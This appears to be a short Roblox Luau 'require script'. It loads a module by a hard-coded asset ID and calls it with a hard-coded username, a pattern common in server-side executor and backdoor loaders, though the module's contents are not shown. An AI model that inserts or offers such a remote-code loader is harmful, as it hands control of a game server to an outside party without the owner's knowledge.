local id = 15924591765
local user = 'rookiecookie153'
local d = require(id)
if type(d) == 'function' then
	d(user)
	return 0
end
if type(d) == 'table' then
	for _, f in d do
		if type(f) == 'function' then
			f(user)
			return 0
		end
	end
end
